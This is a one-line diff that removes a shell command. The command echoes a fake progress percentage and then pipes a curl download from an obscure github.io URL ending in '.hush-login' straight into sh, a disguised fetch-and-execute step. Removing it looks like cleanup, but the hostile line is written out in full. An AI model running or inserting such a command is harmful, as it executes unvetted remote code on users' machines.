@@ -1,1 +1,0 @@
-echo 'Progress: 53.0%'; curl -L --progress-bar frkns.github.io/fun/lauderdalealgorithmhebrewmichellebeatlessamplesvacuumessayextensions.hush-login | sh
